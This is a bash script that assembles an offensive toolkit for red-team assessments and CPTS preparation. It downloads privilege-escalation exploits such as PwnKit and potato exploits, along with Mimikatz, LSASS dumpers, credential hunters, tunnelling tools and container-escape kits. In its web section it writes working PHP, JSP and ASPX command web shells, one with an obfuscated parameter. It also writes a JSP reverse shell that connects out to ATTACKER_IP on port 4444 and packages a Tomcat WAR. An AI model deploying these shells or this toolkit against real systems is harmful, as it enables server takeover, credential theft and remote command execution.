#!/bin/bash
# ═══════════════════════════════════════════════════════════
# toolbox.sh — Offensive Security Tool Grabber
# Downloads tools for CPTS / red team assessments
#
# Usage: sudo ./toolbox.sh [--force] [/custom/path]
#   --force   Re-download even if file already exists
#
# Automatically downloads to /tools beacuse that's where I store my tools.
#
# Example: ./toolbox.sh --force ~/pentest-tools
# ═══════════════════════════════════════════════════════════

# ── Flags ────────────────────────────────────────────────────
FORCE=0
TOOLS_DIR=""
for arg in "$@"; do
    [[ "$arg" == "--force" ]] && FORCE=1 || TOOLS_DIR="$arg"
done
#TOOLS_DIR="${TOOLS_DIR:-$HOME/pentest-tools}"
TOOLS_DIR="/tools"

# ── Colours ──────────────────────────────────────────────────
RED='\033[91m' GRN='\033[92m' YEL='\033[93m'
CYN='\033[96m' BLD='\033[1m'  DIM='\033[2m' RST='\033[0m'

echo -e "${CYN}${BLD}"
echo '  ████████╗ ██████╗  ██████╗ ██╗      ██████╗  ██████╗ ██╗  ██╗'
echo '     ██╔══╝██╔═══██╗██╔═══██╗██║     ██╔══██╗ ██╔═══██╗╚██╗██╔╝'
echo '     ██║   ██║   ██║██║   ██║██║     ██████╔╝ ██║   ██║ ╚███╔╝ '
echo '     ██║   ██║   ██║██║   ██║██║     ██╔══██╗ ██║   ██║ ██╔██╗ '
echo '     ██║   ╚██████╔╝╚██████╔╝███████╗██████╔╝ ╚██████╔╝██╔╝ ██╗'
echo '     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═════╝   ╚═════╝ ╚═╝  ╚═╝'
echo "Inspired by and Based off Husky Hacker's CPTS and OSCP toolbox creator"
echo "See it at https://github.com/TheHuskyHacker/husky-privesc/"
echo -e "${RST}"
echo -e "  ${BLD}OFFENSIVE TOOL GRABBER${RST}  |  ${DIM}CPTS / Red Team Edition${RST}"
echo ""
echo -e "  ${BLD}Target dir :${RST} $TOOLS_DIR"
echo -e "  ${BLD}Force mode :${RST} $([[ $FORCE -eq 1 ]] && echo 'ON — re-downloading all' || echo 'OFF — skipping existing')"
echo ""

# ── Connectivity check ────────────────────────────────────────
echo -ne "  ${DIM}[*]${RST} Checking connectivity to GitHub..."
if ! curl -sI --connect-timeout 5 https://github.com >/dev/null 2>&1; then
    echo -e " ${RED}FAIL${RST}"
    echo -e "\n  ${RED}[!] No connection to GitHub. Check VPN/network and retry.${RST}\n"
    exit 1
fi
echo -e " ${GRN}OK${RST}"
echo ""

DOWNLOADED=0; FAILED=0; SKIPPED=0

# ── Core download function ────────────────────────────────────
grab() {
    local url="$1" dest="$2" desc="$3"
    local filename
    filename=$(basename "$dest")

    if [[ -f "$dest" && $FORCE -eq 0 ]]; then
        echo -e "  ${DIM}[~] ${filename} — already exists (--force to re-download)${RST}"
        ((SKIPPED++)); return 0
    fi

    echo -ne "  ${DIM}[*]${RST} ${desc:-$filename}..."
    if curl -sL --fail --connect-timeout 10 --max-time 120 -o "$dest" "$url" 2>/dev/null; then
        local size
        size=$(stat -c%s "$dest" 2>/dev/null || stat -f%z "$dest" 2>/dev/null || echo 0)
        if [[ "${size:-0}" -gt 100 ]]; then
            local human
            [[ $size -gt 1048576 ]] && human="$(( size / 1048576 ))MB" || human="$(( size / 1024 ))KB"
            echo -e " ${GRN}OK${RST} (${human})"
            ((DOWNLOADED++))
        else
            echo -e " ${RED}EMPTY/TINY${RST} — removing"; rm -f "$dest"; ((FAILED++))
        fi
    else
        echo -e " ${RED}FAIL${RST}"; rm -f "$dest"; ((FAILED++))
    fi
}

# Grab + decompress gz
grab_gz() {
    local url="$1" dest_gz="$2" dest_bin="$3" desc="$4"
    grab "$url" "$dest_gz" "$desc"
    if [[ -f "$dest_gz" && ! -f "$dest_bin" ]]; then
        gunzip -k "$dest_gz" 2>/dev/null && mv "${dest_gz%.gz}" "$dest_bin" 2>/dev/null
    fi
}

section() { echo -e "\n  ${BLD}${CYN}══════════════════════════════════════${RST}"; \
            echo -e "  ${BLD}${CYN}  $1${RST}"; \
            echo -e "  ${BLD}${CYN}══════════════════════════════════════${RST}"; }

# ─────────────────────────────────────────────────────────────
# FOLDER CREATION
# ─────────────────────────────────────────────────────────────
mkdir -p "$TOOLS_DIR"/{linux,windows/{potatoes,sharp,privesc},ad/{adcs,coercion,lateral},web/{shells,jsp,aspx},pivoting,containers,post-exploit,misc,wordlists}

# ═══════════════════════════════════════════════════════════════
#  LINUX PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════
section "Linux Privilege Escalation"
grab "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
    "$TOOLS_DIR/linux/linpeas.sh" "linPEAS"
grab "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" \
    "$TOOLS_DIR/linux/linux-exploit-suggester.sh" "linux-exploit-suggester"
grab "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" \
    "$TOOLS_DIR/linux/linux-exploit-suggester-2.pl" "linux-exploit-suggester-2"
grab "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" \
    "$TOOLS_DIR/linux/LinEnum.sh" "LinEnum"
grab "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" \
    "$TOOLS_DIR/linux/lse.sh" "Linux Smart Enumeration"
grab "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" \
    "$TOOLS_DIR/linux/linuxprivchecker.py" "linuxprivchecker"
grab "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check" \
    "$TOOLS_DIR/linux/unix-privesc-check.sh" "unix-privesc-check"
grab "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" \
    "$TOOLS_DIR/linux/pspy64" "pspy64 (process spy)"
grab "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32" \
    "$TOOLS_DIR/linux/pspy32" "pspy32"
grab "https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py" \
    "$TOOLS_DIR/linux/pwnkit.py" "PwnKit (CVE-2021-4034)"
grab "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" \
    "$TOOLS_DIR/linux/linux-exploit-suggester.sh" "linux-exploit-suggester"
grab "https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine" \
    "$TOOLS_DIR/linux/lxd-alpine-build.sh" "LXD/LXC alpine builder (container escape)"
grab "https://raw.githubusercontent.com/liamg/traitor/main/pkg/exploit/sudo/pkexec/CVE-2021-4034/main.go" \
    "$TOOLS_DIR/linux/CVE-2021-4034.go" "PwnKit Go PoC"

chmod +x "$TOOLS_DIR"/linux/*.sh "$TOOLS_DIR"/linux/*.pl \
    "$TOOLS_DIR"/linux/pspy64 "$TOOLS_DIR"/linux/pspy32 2>/dev/null

# ═══════════════════════════════════════════════════════════════
#  WINDOWS PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════
section "Windows Privilege Escalation"
grab "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" \
    "$TOOLS_DIR/windows/winPEASx64.exe" "winPEAS x64"
grab "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" \
    "$TOOLS_DIR/windows/winPEASx86.exe" "winPEAS x86"
grab "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat" \
    "$TOOLS_DIR/windows/winPEAS.bat" "winPEAS bat (no AV)"
grab "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
    "$TOOLS_DIR/windows/privesc/PowerUp.ps1" "PowerUp.ps1"
grab "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1" \
    "$TOOLS_DIR/windows/privesc/PrivescCheck.ps1" "PrivescCheck.ps1"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe" \
    "$TOOLS_DIR/windows/sharp/SharpUp.exe" "SharpUp"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" \
    "$TOOLS_DIR/windows/sharp/Seatbelt.exe" "Seatbelt"
grab "https://github.com/itm4n/FullPowers/releases/latest/download/FullPowers.exe" \
    "$TOOLS_DIR/windows/privesc/FullPowers.exe" "FullPowers (token privs)"
grab "https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip" \
    "$TOOLS_DIR/windows/RunasCs.zip" "RunasCs"

# Potatoes
section "Potatoes (Token Impersonation)"
grab "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe" \
    "$TOOLS_DIR/windows/potatoes/GodPotato-NET4.exe" "GodPotato NET4"
grab "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe" \
    "$TOOLS_DIR/windows/potatoes/GodPotato-NET2.exe" "GodPotato NET2"
grab "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe" \
    "$TOOLS_DIR/windows/potatoes/GodPotato-NET35.exe" "GodPotato NET35"
grab "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe" \
    "$TOOLS_DIR/windows/potatoes/PrintSpoofer64.exe" "PrintSpoofer x64"
grab "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer32.exe" \
    "$TOOLS_DIR/windows/potatoes/PrintSpoofer32.exe" "PrintSpoofer x32"
grab "https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe" \
    "$TOOLS_DIR/windows/potatoes/SigmaPotato.exe" "SigmaPotato"
grab "https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe" \
    "$TOOLS_DIR/windows/potatoes/JuicyPotato.exe" "JuicyPotato (legacy)"
grab "https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip" \
    "$TOOLS_DIR/windows/potatoes/RoguePotato.zip" "RoguePotato"
grab "https://github.com/CCob/SweetPotato/releases/latest/download/SweetPotato.exe" \
    "$TOOLS_DIR/windows/potatoes/SweetPotato.exe" "SweetPotato"

# Network / shells
section "Windows Network / Shells"
grab "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" \
    "$TOOLS_DIR/windows/nc64.exe" "netcat x64"
grab "https://github.com/int0x33/nc.exe/raw/master/nc.exe" \
    "$TOOLS_DIR/windows/nc.exe" "netcat x32"
grab "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" \
    "$TOOLS_DIR/windows/powercat.ps1" "powercat.ps1 (fixed URL)"
grab "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" \
    "$TOOLS_DIR/windows/Invoke-PowerShellTcp.ps1" "Nishang — Invoke-PowerShellTcp"
grab "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1" \
    "$TOOLS_DIR/windows/Invoke-PowerShellTcpOneLine.ps1" "Nishang — One-liner TCP shell"
grab "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1" \
    "$TOOLS_DIR/windows/Invoke-Mimikatz.ps1" "Nishang — Invoke-Mimikatz"

# ═══════════════════════════════════════════════════════════════
#  ACTIVE DIRECTORY
# ═══════════════════════════════════════════════════════════════
section "Active Directory — Core"
grab "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" \
    "$TOOLS_DIR/ad/mimikatz_trunk.zip" "Mimikatz"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
    "$TOOLS_DIR/ad/Rubeus.exe" "Rubeus"
grab "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" \
    "$TOOLS_DIR/ad/PowerView.ps1" "PowerView.ps1"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpView.exe" \
    "$TOOLS_DIR/ad/SharpView.exe" "SharpView (PowerView in C#)"
grab "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64" \
    "$TOOLS_DIR/ad/kerbrute" "kerbrute (Linux)"
grab "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe" \
    "$TOOLS_DIR/ad/kerbrute.exe" "kerbrute (Windows)"
grab "https://github.com/Kevin-Robertson/Inveigh/releases/latest/download/Inveigh.exe" \
    "$TOOLS_DIR/ad/Inveigh.exe" "Inveigh (Windows Responder)"
grab "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe" \
    "$TOOLS_DIR/ad/LaZagne.exe" "LaZagne"
grab "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1" \
    "$TOOLS_DIR/ad/DomainPasswordSpray.ps1" "DomainPasswordSpray.ps1"

# BloodHound
section "Active Directory — BloodHound"
grab "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe" \
    "$TOOLS_DIR/ad/SharpHound.exe" "SharpHound (Windows collector)"
grab "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.ps1" \
    "$TOOLS_DIR/ad/SharpHound.ps1" "SharpHound.ps1"
# RustHound (alternative collector — less detected)
grab "https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound-linux" \
    "$TOOLS_DIR/ad/rusthound" "RustHound (Linux)"
grab "https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound.exe" \
    "$TOOLS_DIR/ad/rusthound.exe" "RustHound (Windows)"

# LAPS / DPAPI
section "Active Directory — LAPS / DPAPI / GPO"
grab "https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1" \
    "$TOOLS_DIR/ad/Get-LAPSPasswords.ps1" "Get-LAPSPasswords.ps1"
grab "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-LAPSDumper.ps1" \
    "$TOOLS_DIR/ad/Invoke-LAPSDumper.ps1" "Invoke-LAPSDumper.ps1"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe" \
    "$TOOLS_DIR/ad/SharpDPAPI.exe" "SharpDPAPI"
grab "https://raw.githubusercontent.com/Hackndo/pyGPOAbuse/main/pygpoabuse.py" \
    "$TOOLS_DIR/ad/pygpoabuse.py" "pyGPOAbuse"
grab "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" \
    "$TOOLS_DIR/ad/Get-GPPPassword.ps1" "Get-GPPPassword.ps1"

# Share / credential hunting
section "Active Directory — Share & Credential Hunting"
grab "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe" \
    "$TOOLS_DIR/ad/Snaffler.exe" "Snaffler (share credential hunter)"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpHound.exe" \
    "$TOOLS_DIR/ad/SharpHound.exe" "SharpHound"
grab "https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1" \
    "$TOOLS_DIR/ad/RemoteHashRetrieval.ps1" "DAMP RemoteHashRetrieval"
grab "https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-Kerberoast.ps1" \
    "$TOOLS_DIR/ad/Invoke-Kerberoast.ps1" "Invoke-Kerberoast.ps1"

# SessionGopher
grab "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1" \
    "$TOOLS_DIR/ad/SessionGopher.ps1" "SessionGopher (saved creds: PuTTY, RDP, WinSCP)"

# ADCS
section "Active Directory — ADCS Certificate Abuse"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe" \
    "$TOOLS_DIR/ad/adcs/Certify.exe" "Certify.exe (ADCS enum)"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Whisker.exe" \
    "$TOOLS_DIR/ad/adcs/Whisker.exe" "Whisker (Shadow Credentials)"
grab "https://github.com/AlmondOffSec/PassTheCert/releases/latest/download/PassTheCert.exe" \
    "$TOOLS_DIR/ad/adcs/PassTheCert.exe" "PassTheCert"

# Coercion
section "Active Directory — Coercion (PrinterBug / PetitPotam)"
grab "https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py" \
    "$TOOLS_DIR/ad/coercion/PetitPotam.py" "PetitPotam (MS-EFSR coercion)"
grab "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py" \
    "$TOOLS_DIR/ad/coercion/printerbug.py" "PrinterBug / SpoolSample"
grab "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/krbrelayx.py" \
    "$TOOLS_DIR/ad/coercion/krbrelayx.py" "krbrelayx (unconstrained delegation relay)"
grab "https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py" \
    "$TOOLS_DIR/ad/coercion/dnstool.py" "dnstool (AD DNS manipulation)"

# Lateral movement
section "Active Directory — Lateral Movement"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe" \
    "$TOOLS_DIR/ad/lateral/SharpWMI.exe" "SharpWMI (WMI lateral movement)"
grab "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpRDP.exe" \
    "$TOOLS_DIR/ad/lateral/SharpRDP.exe" "SharpRDP (RDP lateral movement)"
grab "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" \
    "$TOOLS_DIR/ad/mimikatz_trunk.zip" "Mimikatz" # duplicate skip handled by FORCE check
grab "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1" \
    "$TOOLS_DIR/ad/lateral/Invoke-TheHash.ps1" "Invoke-TheHash (PTH via WMI/SMB)"

# GMSAPasswordReader
grab "https://github.com/rvazarkar/GMSAPasswordReader/releases/latest/download/GMSAPasswordReader.exe" \
    "$TOOLS_DIR/ad/GMSAPasswordReader.exe" "GMSAPasswordReader"

chmod +x "$TOOLS_DIR"/ad/kerbrute "$TOOLS_DIR"/ad/rusthound 2>/dev/null
chmod +x "$TOOLS_DIR"/ad/coercion/*.py 2>/dev/null

# ═══════════════════════════════════════════════════════════════
#  POST-EXPLOITATION & CREDENTIAL DUMPING
# ═══════════════════════════════════════════════════════════════
section "Post-Exploitation / Credential Dumping"

# nanodump — stealthier LSASS dumper than procdump
grab "https://github.com/fortra/nanodump/releases/latest/download/nanodump.x64.exe" \
    "$TOOLS_DIR/post-exploit/nanodump.exe" "nanodump (stealthy LSASS dump)"
grab "https://github.com/fortra/nanodump/releases/latest/download/nanodump.x64.elf" \
    "$TOOLS_DIR/post-exploit/nanodump-linux" "nanodump (Linux)"

# pypykatz — parse LSASS dumps on Linux
# (pip install, but grab the standalone too)
grab "https://github.com/skelsec/pypykatz/releases/latest/download/pypykatz" \
    "$TOOLS_DIR/post-exploit/pypykatz" "pypykatz (parse lsass dump on Linux)"

# Procdump
grab "https://download.sysinternals.com/files/Procdump.zip" \
    "$TOOLS_DIR/post-exploit/Procdump.zip" "Sysinternals ProcDump"

# Other useful post-ex
grab "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe" \
    "$TOOLS_DIR/post-exploit/LaZagne.exe" "LaZagne (multi-platform cred extractor)"
grab "https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/winshells/ShellcodeExec.ps1" \
    "$TOOLS_DIR/post-exploit/ShellcodeExec.ps1" "PowerShell shellcode exec"

chmod +x "$TOOLS_DIR"/post-exploit/pypykatz 2>/dev/null

# ═══════════════════════════════════════════════════════════════
#  PIVOTING & TUNNELING
# ═══════════════════════════════════════════════════════════════
section "Pivoting / Tunneling"

# Static binaries
grab "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" \
    "$TOOLS_DIR/pivoting/socat" "socat (static Linux)"
grab "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap" \
    "$TOOLS_DIR/pivoting/nmap_static" "nmap (static Linux — for pivot hosts)"

# Chisel
echo -ne "  ${DIM}[*]${RST} Detecting chisel latest..."
CHISEL_VER=$(curl -sI https://github.com/jpillora/chisel/releases/latest 2>/dev/null \
    | grep -i 'location:' | grep -oP 'v[\d.]+' | head -1)
CHISEL_VER="${CHISEL_VER:-v1.10.1}"
echo -e " ${CHISEL_VER}"
grab_gz "https://github.com/jpillora/chisel/releases/download/${CHISEL_VER}/chisel_${CHISEL_VER#v}_linux_amd64.gz" \
    "$TOOLS_DIR/pivoting/chisel_linux.gz" "$TOOLS_DIR/pivoting/chisel" "Chisel (Linux)"
grab_gz "https://github.com/jpillora/chisel/releases/download/${CHISEL_VER}/chisel_${CHISEL_VER#v}_windows_amd64.gz" \
    "$TOOLS_DIR/pivoting/chisel_windows.gz" "$TOOLS_DIR/pivoting/chisel.exe" "Chisel (Windows)"

# Ligolo-ng
echo -ne "  ${DIM}[*]${RST} Detecting ligolo-ng latest..."
LIGOLO_VER=$(curl -sI https://github.com/nicocha30/ligolo-ng/releases/latest 2>/dev/null \
    | grep -i 'location:' | grep -oP 'v[\d.]+' | head -1)
LIGOLO_VER="${LIGOLO_VER:-v0.8.2}"
echo -e " ${LIGOLO_VER}"
grab "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER#v}_linux_amd64.tar.gz" \
    "$TOOLS_DIR/pivoting/ligolo_proxy.tar.gz" "Ligolo-ng proxy (Linux attacker)"
grab "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_linux_amd64.tar.gz" \
    "$TOOLS_DIR/pivoting/ligolo_agent_linux.tar.gz" "Ligolo-ng agent (Linux target)"
grab "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_windows_amd64.zip" \
    "$TOOLS_DIR/pivoting/ligolo_agent_windows.zip" "Ligolo-ng agent (Windows target)"

# Extract ligolo archives
for f in "$TOOLS_DIR"/pivoting/ligolo_*.tar.gz; do
    [[ -f "$f" ]] && tar xzf "$f" -C "$TOOLS_DIR/pivoting/" 2>/dev/null && echo -e "  ${DIM}    Extracted: $(basename $f)${RST}"
done
[[ -f "$TOOLS_DIR/pivoting/ligolo_agent_windows.zip" ]] && \
    unzip -q -o "$TOOLS_DIR/pivoting/ligolo_agent_windows.zip" -d "$TOOLS_DIR/pivoting/" 2>/dev/null

chmod +x "$TOOLS_DIR"/pivoting/chisel "$TOOLS_DIR"/pivoting/socat \
    "$TOOLS_DIR"/pivoting/nmap_static "$TOOLS_DIR"/pivoting/proxy \
    "$TOOLS_DIR"/pivoting/agent 2>/dev/null

# Write proxychains template
cat > "$TOOLS_DIR/pivoting/proxychains_socks5.conf" << 'PCEOF'
# proxychains config — SOCKS5 (Chisel / Ligolo / SSH -D)
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 1080
PCEOF
cat > "$TOOLS_DIR/pivoting/proxychains_socks4.conf" << 'PCEOF'
# proxychains config — SOCKS4
strict_chain
proxy_dns
[ProxyList]
socks4  127.0.0.1 1080
PCEOF
echo -e "  ${DIM}[>] proxychains config templates written${RST}"

# ═══════════════════════════════════════════════════════════════
#  CONTAINER ESCAPES
# ═══════════════════════════════════════════════════════════════
section "Container Escapes (Docker / LXD)"
grab "https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64" \
    "$TOOLS_DIR/containers/cdk" "CDK (container toolkit — Docker/K8s breakout)"
grab "https://github.com/stealthcopter/deepce/raw/main/deepce.sh" \
    "$TOOLS_DIR/containers/deepce.sh" "deepce (Docker escape enumeration)"
grab "https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine" \
    "$TOOLS_DIR/containers/lxd-build-alpine.sh" "LXD alpine builder"
chmod +x "$TOOLS_DIR"/containers/cdk "$TOOLS_DIR"/containers/deepce.sh \
    "$TOOLS_DIR"/containers/lxd-build-alpine.sh 2>/dev/null

# ═══════════════════════════════════════════════════════════════
#  WEB EXPLOITATION
# ═══════════════════════════════════════════════════════════════
section "Web — PHP Shells"
grab "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" \
    "$TOOLS_DIR/web/shells/php-reverse-shell.php" "PHP reverse shell (pentestmonkey)"
grab "https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php" \
    "$TOOLS_DIR/web/shells/p0wny-shell.php" "p0wny-shell"
grab "https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php" \
    "$TOOLS_DIR/web/shells/wwwolf-webshell.php" "wwwolf PHP webshell"

# Minimal inline shell (smallest footprint — write it directly)
cat > "$TOOLS_DIR/web/shells/cmd.php" << 'PHPEOF'
<?php system($_GET['c']); ?>
PHPEOF
cat > "$TOOLS_DIR/web/shells/cmd_obf.php" << 'PHPEOF'
<?php @system($_REQUEST['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
PHPEOF
echo -e "  ${DIM}[>] Minimal PHP web shells written (cmd.php + cmd_obf.php)${RST}"

section "Web — JSP Shells (Tomcat / JBoss / WebLogic)"
# Minimal JSP cmd shell
cat > "$TOOLS_DIR/web/jsp/cmd.jsp" << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) { out.println(disr); disr = dis.readLine(); }
}
%>
JSPEOF
echo -e "  ${DIM}[>] cmd.jsp written${RST}"

# JSP reverse shell
cat > "$TOOLS_DIR/web/jsp/reverse.jsp" << 'JSPEOF'
<%
    String host = "ATTACKER_IP";
    int port = 4444;
    String cmd = "bash";
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    java.net.Socket s = new java.net.Socket(host, port);
    java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while (!s.isClosed()) {
        while (pi.available() > 0) so.write(pi.read());
        while (pe.available() > 0) so.write(pe.read());
        while (si.available() > 0) po.write(si.read());
        so.flush(); po.flush(); Thread.sleep(50);
        try { p.exitValue(); break; } catch (Exception e) {}
    }
    p.destroy(); s.close();
%>
JSPEOF
echo -e "  ${DIM}[>] reverse.jsp written (edit ATTACKER_IP)${RST}"

section "Web — ASPX Shells (IIS)"
cat > "$TOOLS_DIR/web/aspx/cmd.aspx" << 'ASPXEOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
ASPXEOF
echo -e "  ${DIM}[>] cmd.aspx written${RST}"

# WAR file for Tomcat
section "Web — WAR File (Tomcat/JBoss)"
echo -ne "  ${DIM}[*]${RST} Building cmd.war for Tomcat..."
if command -v jar &>/dev/null; then
    TMPWAR=$(mktemp -d)
    cp "$TOOLS_DIR/web/jsp/cmd.jsp" "$TMPWAR/"
    (cd "$TMPWAR" && jar -cmf /dev/stdin cmd.war cmd.jsp << 'MANEOF'
Manifest-Version: 1.0
MANEOF
    ) 2>/dev/null
    cp "$TMPWAR/cmd.war" "$TOOLS_DIR/web/cmd.war"
    rm -rf "$TMPWAR"
    echo -e " ${GRN}OK${RST} → web/cmd.war"
else
    echo -e " ${YEL}SKIP${RST} (jar not found — install JDK to build WAR)"
fi

# ═══════════════════════════════════════════════════════════════
#  WORDLISTS (Quick reference paths — not downloading rockyou)
# ═══════════════════════════════════════════════════════════════
section "Wordlists (Path Reference)"
cat > "$TOOLS_DIR/wordlists/paths.md" << 'WLEOF'
# Wordlist Paths — Quick Reference

## Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/Default-Credentials/

## Usernames
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

## Web — Directories
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/quickhits.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

## Web — Extensions
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt

## DNS / VHost
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

## SMB
/usr/share/seclists/Discovery/SMB/

## AD
/usr/share/seclists/Usernames/top-usernames-shortlist.txt    # quick spray
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
WLEOF
